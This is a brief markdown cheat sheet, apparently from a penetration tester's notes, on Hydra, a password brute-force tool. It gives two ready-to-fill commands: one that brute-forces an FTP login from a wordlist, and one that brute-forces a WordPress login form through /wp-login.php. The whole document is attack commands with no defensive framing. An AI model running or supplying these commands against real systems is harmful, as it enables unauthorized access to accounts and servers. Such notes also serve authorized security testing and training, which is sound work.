# Hydra

Hydra is a brute-force attack tool.

## Bruteforce a FTP server
```bash
hydra -t 4 -l [username] -P [wordlist] -vV [ip] ftp
```

## Bruteforce a Wordpress
```bash
hydra -L [users] -P [passwords] [ip] -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:[error_message]'
```
